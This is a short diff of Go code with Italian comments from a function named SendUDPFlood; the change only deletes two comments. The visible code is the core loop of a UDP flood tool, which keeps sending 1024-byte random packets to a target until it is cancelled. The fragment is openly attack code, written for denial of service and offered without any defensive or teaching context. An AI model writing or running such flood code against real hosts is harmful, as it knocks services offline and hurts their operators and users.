@@ -37,13 +37,11 @@ func SendUDPFlood(target string, port int, wg *sync.WaitGroup, ctx context.Conte
 	packet := generateRandomBytes(1024) // Pacchetto UDP da 1024 byte
 
 	for {
-		// Verifica immediatamente se il contesto è stato cancellato
 		select {
 		case <-ctx.Done():
 			log.Println("UDP flood interrotto.")
 			return
 		default:
-			// Procedi con l'invio del pacchetto
 			_, err := conn.Write(packet)
 			if err != nil {
 				log.Printf("Errore nell'invio del pacchetto UDP: %v", err)
